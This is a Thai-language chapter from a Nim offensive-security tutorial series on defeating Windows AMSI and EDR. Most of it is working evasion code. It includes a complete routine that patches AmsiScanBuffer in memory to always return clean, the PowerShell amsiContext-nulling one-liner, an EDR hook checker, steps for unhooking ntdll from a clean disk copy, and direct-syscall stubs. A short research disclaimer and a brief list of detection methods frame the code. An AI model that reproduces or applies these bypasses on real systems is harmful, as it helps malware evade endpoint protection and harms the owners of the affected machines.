# Part 35: AMSI และ EDR Bypass

> **คำเตือน**: เนื้อหานี้เพื่อการอัปเดตความรู้ด้าน security research
> และการสร้าง defensive tools เท่านั้น

## AMSI คืออะไร

```
AMSI = Antimalware Scan Interface

Windows AMSI architecture:

Application (PowerShell, WScript, etc.)
    |
    v
AMSI API (amsi.dll)
    |
    v
AMSI Provider (Windows Defender, etc.)
    |
    v
Scan Result (AMSI_RESULT_CLEAN or DETECTED)

ทำไมถึงไม่ใช่ signature-based:
AMSI ให้ AV สแกน content ก่อน execute
ตัวอย่าง: PowerShell script ถูกสแกนก่อนรัน
```

## AMSI Architecture ใน Windows

```nim
# amsi_arch.nim
# เข้าใจ AMSI interface

when defined(windows):
  import winlean

  type
    AMSI_RESULT* = enum
      AMSI_RESULT_CLEAN = 0
      AMSI_RESULT_NOT_DETECTED = 1
      AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000
      AMSI_RESULT_BLOCKED_BY_ADMIN_END = 0x4FFF
      AMSI_RESULT_DETECTED = 0x8000
    
    HAMSICONTEXT* = pointer
    HAMSISESSION* = pointer

  proc AmsiInitialize*(appName: ptr uint16, amsiContext: ptr HAMSICONTEXT): HRESULT
    {.importc, dynlib: "amsi.dll".}
  
  proc AmsiScanBuffer*(amsiContext: HAMSICONTEXT,
                       buffer: pointer, length: ULONG,
                       contentName: ptr uint16,
                       amsiSession: HAMSISESSION,
                       result: ptr AMSI_RESULT): HRESULT
    {.importc, dynlib: "amsi.dll".}
  
  proc AmsiScanString*(amsiContext: HAMSICONTEXT,
                       s: ptr uint16, contentName: ptr uint16,
                       amsiSession: HAMSISESSION,
                       result: ptr AMSI_RESULT): HRESULT
    {.importc, dynlib: "amsi.dll".}
  
  proc AmsiUninitialize*(amsiContext: HAMSICONTEXT)
    {.importc, dynlib: "amsi.dll".}

  proc amsiResultIsMalware(result: AMSI_RESULT): bool =
    result.ord >= AMSI_RESULT_DETECTED.ord

  # Example: Use AMSI to scan your own content
  proc scanContent(content: string): bool =
    var ctx: HAMSICONTEXT
    let appName = newWideCString("NimAMSITest")
    
    if AmsiInitialize(cast[ptr uint16](appName), addr ctx) != 0:
      echo "AmsiInitialize failed"
      return false
    defer: AmsiUninitialize(ctx)
    
    var scanResult: AMSI_RESULT
    let contentBuf = content.cstring
    let contentName = newWideCString("test")
    
    if AmsiScanBuffer(ctx, contentBuf, content.len.ULONG,
                      cast[ptr uint16](contentName), nil,
                      addr scanResult) != 0:
      echo "AmsiScanBuffer failed"
      return false
    
    echo "AMSI result: ", scanResult
    amsiResultIsMalware(scanResult)
```

## AMSI Bypass Techniques (เพื่อเข้าใจ EDR detection)

```nim
# amsi_bypass_research.nim
# AMSI bypass techniques - ศึกษาวิธี AV ตรวจจับ

when defined(windows):
  import winlean, strformat
  
  proc GetProcAddress*(hModule: HANDLE, lpProcName: cstring): pointer
    {.importc, dynlib: "kernel32".}
  proc GetModuleHandleA*(lpModuleName: cstring): HANDLE
    {.importc, dynlib: "kernel32".}
  proc VirtualProtect*(lpAddress: pointer, dwSize: SIZE_T,
                       flNewProtect: DWORD, lpflOldProtect: ptr DWORD): BOOL
    {.importc, dynlib: "kernel32".}
  
  const PAGE_EXECUTE_READWRITE = 0x40.DWORD
  const PAGE_READWRITE = 0x04.DWORD

  # Technique 1: Patch AmsiScanBuffer to always return clean
  proc patchAmsiScanBuffer(): bool =
    ## Modify AmsiScanBuffer's first bytes to return AMSI_RESULT_CLEAN
    ## This is a well-known bypass studied for AV research
    
    let amsiDll = GetModuleHandleA("amsi.dll")
    if amsiDll == nil:
      echo "[!] amsi.dll not loaded"
      return false
    
    let amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer")
    if amsiScanBuffer == nil:
      echo "[!] AmsiScanBuffer not found"
      return false
    
    echo &"[*] AmsiScanBuffer at 0x{cast[uint](amsiScanBuffer):016X}"
    
    # Patch: overwrite with `xor eax,eax; ret` (return 0 = AMSI_RESULT_CLEAN)
    # 31 C0  - XOR EAX, EAX  (sets return value to 0)
    # C3     - RET
    let patch = @[0x31.byte, 0xC0.byte, 0xC3.byte]
    
    # Make memory writable
    var oldProtect: DWORD
    if VirtualProtect(amsiScanBuffer, patch.len.SIZE_T, PAGE_READWRITE,
                      addr oldProtect) == FALSE:
      echo "[!] VirtualProtect failed"
      return false
    
    # Write patch
    copyMem(amsiScanBuffer, unsafeAddr patch[0], patch.len)
    
    # Restore protection
    var dummy: DWORD
    discard VirtualProtect(amsiScanBuffer, patch.len.SIZE_T, oldProtect, addr dummy)
    
    echo "[+] AmsiScanBuffer patched"
    return true

  # Technique 2: Force AmsiInitialize to fail via context corruption
  proc corruptAmsiContext(): bool =
    ## AmsiInitialize stores context struct; corruption bypasses AMSI
    ## Technique studied by researchers (published bypass)
    
    # In PowerShell: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    # .GetField('amsiContext').SetValue($null, [IntPtr]0x0)
    # (PowerShell-specific technique)
    echo "[*] Context corruption (PowerShell-specific technique)"
    echo "    Targets: amsiContext field in System.Management.Automation.AmsiUtils"
    true

  # Technique 3: Use AMSI providers' own bypass
  # Some AV vendors have had their AMSI providers contain bypasses
  # (responsible disclosure done by researchers)

  # Detection by defenders:
  echo """
=== AMSI Bypass Detection ===
1. Monitor memory writes to amsi.dll (page protections)
2. ETW: Microsoft-Antimalware-Engine events
3. Kernel callbacks: PsSetLoadImageNotifyRoutine
4. AmsiScanBuffer patch patterns (31 C0 C3 etc.)
5. Randomize AMSI internals (ASLR + obfuscation in AV)
"""
```

## EDR Hooks และ Unhooking

```nim
# edr_hooks.nim
# เข้าใจวิธี EDR hook Win32 API

## EDR Hook Architecture:
## Ntdll.dll  <--  EDR loads and modifies Nt* functions
## 
## Application calls NtAllocateVirtualMemory()
## --> JMP hook to EDR's inspection code
## --> EDR analyzes parameters
## --> If benign: continues to real syscall
## --> If malicious: blocks

when defined(windows):
  import winlean, strformat

  # Check if function is hooked (first bytes != expected)
  proc checkHook(funcName: string): tuple[hooked: bool, bytes: seq[byte]] =
    let ntdll = GetModuleHandleA("ntdll.dll")
    if ntdll == nil:
      return (false, @[])
    
    let funcAddr = GetProcAddress(ntdll, funcName)
    if funcAddr == nil:
      return (false, @[])
    
    # Read first 5 bytes
    let firstBytes = cast[ptr array[5, byte]](funcAddr)
    var bytes = @[firstBytes[0], firstBytes[1], firstBytes[2],
                  firstBytes[3], firstBytes[4]]
    
    # Normal ntdll stub starts with:
    # 4C 8B D1  - MOV R10, RCX
    # B8 xx xx  - MOV EAX, <syscall_number>
    # 0F 05     - SYSCALL
    # C3        - RET
    
    # Hook signature (JMP hook): E9 xx xx xx xx
    let isHooked = bytes[0] == 0xE9.byte  # JMP relative
    
    echo &"[*] {funcName}: {'HOOKED' if isHooked else 'CLEAN'}"
    echo &"    First bytes: {bytes.mapIt(it.toHex(2)).join(' ')}"
    
    (isHooked, bytes)

  let apis = ["NtAllocateVirtualMemory", "NtProtectVirtualMemory",
               "NtCreateThread", "NtWriteVirtualMemory", "LdrLoadDll"]
  
  for api in apis:
    let (hooked, bytes) = checkHook(api)

  # Unhooking via clean ntdll copy
  proc unhookNtdll(): bool =
    ## Load clean copy of ntdll from disk, restore hooked functions
    ## Research technique studied by AV teams for detection improvement
    
    # 1. Read ntdll from disk
    let ntdllPath = r"C:\Windows\System32\ntdll.dll"
    let cleanNtdll = readFile(ntdllPath)
    
    # 2. Parse PE to find .text section of clean copy
    # 3. Find hooked functions in memory
    # 4. Compare and restore if different
    
    echo "[*] Unhooking via clean disk copy:"
    echo "    1. Read ntdll.dll from C:\\Windows\\System32\\"
    echo "    2. Parse PE .text section"
    echo "    3. Locate hooked stubs in memory (compare bytes)"
    echo "    4. VirtualProtect -> copy clean bytes -> restore protection"
    echo "    5. Verify hooks removed"
    true
```

## Direct Syscalls

```nim
# direct_syscalls.nim
# Bypass EDR hooks by calling syscalls directly
# ไม่ผ่าน ntdll.dll โดยตรง

when defined(windows):
  # Direct syscall using inline assembly
  # syscall number must be found dynamically or from known table
  
  # NtAllocateVirtualMemory syscall number (Windows 10/11)
  # This changes per Windows version!
  const NtAllocateVirtualMemory_SyscallNum = 0x18.uint32  # Win10 2004+
  
  # Inject syscall stub via emit
  proc ntAllocateVirtualMemoryStub() =
    {.emit: """
    /* Direct syscall stub for NtAllocateVirtualMemory */
    __asm__ (
      "mov r10, rcx\n"
      "mov eax, 0x18\n"  /* syscall number */
      "syscall\n"
      "ret\n"
    );
    """.}
  
  # Safer approach: dynamically resolve syscall numbers from ntdll
  proc getSyscallNumber(funcName: string): uint32 =
    ## Extract syscall number from ntdll stub
    ## Pattern: 4C 8B D1 B8 [syscall_num] 0F 05 C3
    let ntdll = GetModuleHandleA("ntdll.dll")
    let fn = GetProcAddress(ntdll, funcName)
    
    if fn == nil: return 0
    
    # Read bytes looking for MOV EAX, <number> pattern
    let bytes = cast[ptr UncheckedArray[byte]](fn)
    
    # Bytes 0-2: 4C 8B D1 (MOV R10, RCX)
    # Byte 3: B8 (MOV EAX,)
    # Bytes 4-7: syscall number (little-endian)
    if bytes[0] == 0x4C and bytes[1] == 0x8B and bytes[2] == 0xD1 and bytes[3] == 0xB8:
      return cast[ptr uint32](addr bytes[4])[]
    
    # If hooked, the B8 might be at offset 0 (some EDRs preserve prologue)
    # More robust parsing needed for production
    0
  
  echo "Syscall numbers:"
  for api in ["NtAllocateVirtualMemory", "NtProtectVirtualMemory",
               "NtCreateThreadEx", "NtWriteVirtualMemory"]:
    let num = getSyscallNumber(api)
    echo &"  {api}: 0x{num:04X}"
```

## สรุป Part 35

ในบทนี้เราได้เรียนรู้:
- ✅ AMSI architecture
- ✅ AMSI bypass techniques (เพื่อเข้าใจการตรวจจับ)
- ✅ EDR hooks และการตรวจสอบ
- ✅ Unhooking เทคนิค
- ✅ Direct syscalls
- ✅ Detection methods สำหรับ defenders

---

**Previous**: [Part 34 - AV Evasion](part34_av_evasion.md)
**Next**: [Part 36 - Direct Syscalls](part36_direct_syscalls.md)
